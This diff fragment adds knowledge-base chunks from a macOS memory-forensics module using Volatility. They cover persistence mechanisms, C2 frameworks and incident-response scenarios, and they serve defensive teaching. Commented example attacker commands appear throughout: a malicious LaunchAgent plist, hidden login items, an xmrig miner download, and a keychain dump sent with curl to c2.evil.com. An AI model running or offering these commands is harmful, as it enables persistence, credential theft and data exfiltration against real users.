+    "content": "### 1. LaunchAgents (User-Level)\n**Location**: ~/Library/LaunchAgents/\n\n**Purpose**: Run malware when user logs in\n\n**Detection:**\n```bash\nvol -f memory.aff4 mac.bash.Bash | grep LaunchAgents\n\n# Example:\n# bash: cat > ~/Library/LaunchAgents/com.malware.plist << EOF\n# <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n# <plist version=\"1.0\">\n#   <dict>\n#     <key>Label</key>\n#     <string>com.malware</string>\n#     <key>ProgramArguments</key>\n#     <array>\n#       <string>/tmp/malware.sh</string>\n#     </array>\n#     <key>RunAtLoad</key>\n#     <true/>\n#   </dict>\n# </plist>\n# EOF\n# bash: launchctl load ~/Library/LaunchAgents/com.malware.plist\n```\n\n**IOCs:**\n- Random plist filenames (com.xyz.agent.plist)\n- Plist files pointing to /tmp or /private/tmp\n- Recently modified plist files (check timestamps)",
+    "metadata": {
+      "filename": "07_mac_forensics.md",
+      "document_title": "macOS Memory Forensics with Volatility",
+      "section": "macOS Persistence Mechanisms",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "07_mac_forensics.md_141",
+    "content": "### 2. LaunchDaemons (System-Level)\n**Location**: /Library/LaunchDaemons/\n\n**Purpose**: Run malware as root at system startup\n\n**Requires**: Root privileges to install\n\n**Detection:**\n```bash\nvol -f memory.aff4 mac.bash.Bash | grep LaunchDaemons\n\n# Example:\n# bash: sudo cp com.malware.plist /Library/LaunchDaemons/\n# bash: sudo launchctl load /Library/LaunchDaemons/com.malware.plist\n```\n\n### 3. Login Items\n**Purpose**: Run applications at user login\n\n**Detection:**\n```bash\n# Stored in: ~/Library/Preferences/com.apple.loginitems.plist\nvol -f memory.aff4 mac.bash.Bash | grep loginitems\n\n# Example:\n# bash: osascript -e 'tell application \"System Events\" to make login item at end with properties {path:\"/Applications/Malware.app\", hidden:true}'\n```",
+    "metadata": {
+      "filename": "07_mac_forensics.md",
+      "document_title": "macOS Memory Forensics with Volatility",
+      "section": "macOS Persistence Mechanisms",
+      "chunk_index": 1,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "07_mac_forensics.md_142",
+    "content": "### 4. Browser Extensions\n**Purpose**: Inject ads, steal credentials, redirect searches\n\n**Detection:**\n```bash\n# Safari: ~/Library/Safari/Extensions/\n# Chrome: ~/Library/Application Support/Google/Chrome/Default/Extensions/\n\nvol -f memory.aff4 mac.bash.Bash | grep -i \"extension\\|plugin\"\n```\n\n### 5. Dylib Hijacking\n**Purpose**: Load malicious library instead of legitimate one\n\n**How it works:**\n```bash\n# macOS looks for libraries in this order:\n# 1. @rpath (relative path)\n# 2. @executable_path/../Frameworks\n# 3. /usr/lib\n# 4. /usr/local/lib\n\n# Attacker places malicious dylib in @rpath location\n# Legitimate app loads malicious dylib instead of expected one\n```\n\n**Detection:**\n```bash\nvol -f memory.aff4 mac.lsof.Lsof | grep \"\\.dylib\"",
+    "metadata": {
+      "filename": "07_mac_forensics.md",
+      "document_title": "macOS Memory Forensics with Volatility",
+      "section": "macOS Persistence Mechanisms",
+      "chunk_index": 2,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "07_mac_forensics.md_143",
+    "content": "# Look for dylibs in unusual locations:\n# - /tmp/evil.dylib\n# - /Users/Shared/evil.dylib\n```",
+    "metadata": {
+      "filename": "07_mac_forensics.md",
+      "document_title": "macOS Memory Forensics with Volatility",
+      "section": "macOS Persistence Mechanisms",
+      "chunk_index": 3,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "07_mac_forensics.md_144",
+    "content": "### Empire (PowerShell Empire)\n\n**macOS Agent:**\n- Python-based agent\n- Uses HTTPS for C2 communication\n- Supports in-memory execution\n\n**Detection:**\n```bash\nvol -f memory.aff4 mac.bash.Bash | grep -i \"empire\\|powershell\"\nvol -f memory.aff4 mac.netstat.Netstat | grep \":443\"\n\n# Example:\n# Python: base64-encoded Empire stager\n# Network: HTTPS connection to C2 server\n```\n\n### Metasploit Meterpreter\n\n**macOS Meterpreter:**\n```bash\n# Payloads:\n# - python/meterpreter/reverse_tcp\n# - python/meterpreter/reverse_https\n\n# Detection:\nvol -f memory.aff4 mac.bash.Bash | grep -i \"meterpreter\\|msf\\|payload\"\n```\n\n### Sliver C2\n\n**Modern C2 framework (Go-based):**\n```bash\n# Implant: Compiled Go binary\n# C2: mTLS encrypted (hard to detect without process analysis)",
+    "metadata": {
+      "filename": "07_mac_forensics.md",
+      "document_title": "macOS Memory Forensics with Volatility",
+      "section": "macOS C2 Frameworks",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "07_mac_forensics.md_145",
+    "content": "# Detection:\nvol -f memory.aff4 mac.pslist.PsList | grep -i \"sliver\"\nvol -f memory.aff4 mac.netstat.Netstat | grep \"ESTABLISHED\"\n```",
+    "metadata": {
+      "filename": "07_mac_forensics.md",
+      "document_title": "macOS Memory Forensics with Volatility",
+      "section": "macOS C2 Frameworks",
+      "chunk_index": 1,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "07_mac_forensics.md_146",
+    "content": "### Scenario 1: Suspected Adware Infection\n\n**Analysis:**\n```bash\n# Step 1: List all processes\nvol -f memory.aff4 mac.pslist.PsList > processes.txt\n\n# Step 2: Find suspicious processes\ncat processes.txt | grep -i \"/Library/Application Support\\|/tmp\\|/private/tmp\"\n\n# Step 3: Check LaunchAgents\nvol -f memory.aff4 mac.bash.Bash | grep LaunchAgents\n\n# Example findings:\n# Process: /Library/Application Support/MacHelper/helper\n# LaunchAgent: ~/Library/LaunchAgents/com.machelper.agent.plist\n\n# Step 4: Check network connections\nvol -f memory.aff4 mac.netstat.Netstat | grep \"helper\"\n# Example: TCP connection to ad network (ads.example.com:443)\n```\n\n**Remediation:**\n1. Remove LaunchAgent plist file\n2. Kill malicious process\n3. Delete malware files\n4. Reset browser settings",
+    "metadata": {
+      "filename": "07_mac_forensics.md",
+      "document_title": "macOS Memory Forensics with Volatility",
+      "section": "Practical macOS Forensics Workflow",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "07_mac_forensics.md_147",
+    "content": "### Scenario 2: Cryptocurrency Miner\n\n**Analysis:**\n```bash\n# Step 1: Find bash history\nvol -f memory.aff4 mac.bash.Bash > bash_history.txt\n\n# Step 2: Search for miner downloads\ncat bash_history.txt | grep -i \"xmrig\\|miner\\|curl\"\n\n# Example:\n# bash: curl -s https://github.com/xmrig/xmrig/releases/download/v6.16.0/xmrig-6.16.0-macos-x64.tar.gz | tar xz\n# bash: ./xmrig --url pool.supportxmr.com:443 --user 47ABC...\n\n# Step 3: Find miner process\nvol -f memory.aff4 mac.pslist.PsList | grep xmrig\n# PID 1234: /tmp/xmrig\n\n# Step 4: Check persistence\nvol -f memory.aff4 mac.bash.Bash | grep -i \"launchagent\\|crontab\"\n```\n\n### Scenario 3: Infostealer (MacStealer)\n\n**Analysis:**\n```bash\n# Step 1: Check for keychain access\nvol -f memory.aff4 mac.bash.Bash | grep -i \"keychain\\|security\"",
+    "metadata": {
+      "filename": "07_mac_forensics.md",
+      "document_title": "macOS Memory Forensics with Volatility",
+      "section": "Practical macOS Forensics Workflow",
+      "chunk_index": 1,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "07_mac_forensics.md_148",
+    "content": "# Example:\n# bash: security dump-keychain ~/Library/Keychains/login.keychain-db > /tmp/keys.txt\n# bash: curl -X POST -d @/tmp/keys.txt https://c2.evil.com/exfil\n\n# Step 2: Check for wallet access\nvol -f memory.aff4 mac.bash.Bash | grep -i \"wallet\\|electrum\\|exodus\"\n\n# Example:\n# bash: tar czf /tmp/wallets.tar.gz ~/Library/Application\\ Support/Electrum/\n\n# Step 3: Find exfiltration\nvol -f memory.aff4 mac.netstat.Netstat | grep ESTABLISHED\n# TCP connection to c2.evil.com:443\n```",
+    "metadata": {
+      "filename": "07_mac_forensics.md",
+      "document_title": "macOS Memory Forensics with Volatility",
+      "section": "Practical macOS Forensics Workflow",
+      "chunk_index": 2,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "07_mac_forensics.md_149",
+    "content": "1. **macOS is NOT immune**: Malware, adware, and APTs target macOS\n2. **SIP complicates acquisition**: Modern macOS requires SIP disabled for full memory access\n3. **LaunchAgents/LaunchDaemons**: Primary persistence mechanisms on macOS\n4. **Bash history is crucial**: Reveals attacker commands and TTPs\n5. **Adware is most common**: But sophisticated threats exist (Lazarus Group, APT32)\n6. **Apple Silicon (M1/M2)**: Limited forensic tooling available\n\n**Golden Rule**: ANY LaunchAgent/LaunchDaemon with random name or in unusual location is suspicious.",
+    "metadata": {
+      "filename": "07_mac_forensics.md",
+      "document_title": "macOS Memory Forensics with Volatility",
+      "section": "Key Takeaways",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "07_mac_forensics.md_150",
+    "content": "- **Module 08**: Advanced kernel analysis\n- **Module 09**: Timeline generation and correlation\n- **Module 10**: Reporting and legal considerations\n\n---\n\n**References**:\n- \"The Mac Hacker's Handbook\" by Charlie Miller and Dino Dai Zovi\n- \"macOS Incident Response\" by Jaron Bradley\n- Objective-See: https://objective-see.com/ (Mac security research)\n- Patrick Wardle's research: https://www.patreon.com/patrickwardle",
+    "metadata": {
+      "filename": "07_mac_forensics.md",
+      "document_title": "macOS Memory Forensics with Volatility",
+      "section": "What's Next?",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  }
+]
